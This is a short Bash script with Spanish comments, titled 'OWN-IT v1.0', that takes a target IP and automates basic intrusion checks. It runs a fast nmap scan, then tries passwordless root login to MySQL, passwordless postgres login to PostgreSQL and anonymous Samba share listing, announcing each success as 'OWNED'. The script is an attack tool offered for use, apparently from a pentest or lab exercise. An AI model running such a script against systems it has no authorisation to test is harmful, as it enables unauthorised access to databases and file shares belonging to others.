#!/bin/bash
# OWN-IT v1.0 – by davidperlaza14
# Uso: ./ownit_day3.sh <IP>

IP=$1
echo "[+] Escaneando $IP rápido..."
nmap -F "$IP" -oN nmap_fast.txt
echo "[+] Atacando MySQL sin pass..."
mysql -h "$IP" -u root -e "SHOW databases;" 2>/dev/null && echo "[+] MySQL OWNED" || echo "[-] MySQL no fue"
echo "[+] Atacando PostgreSQL sin pass..."
psql -U postgres -h "$IP" -c "\l" 2>/dev/null && echo "[+] PostgreSQL OWNED" || echo "[-] PostgreSQL no fue"
echo "[+] Listando Samba sin pass..."
smbclient -L //"$IP" -N 2>/dev/null | grep "Disk" && echo "[+] Samba shares vistas" || echo "[-] Samba cerrado"
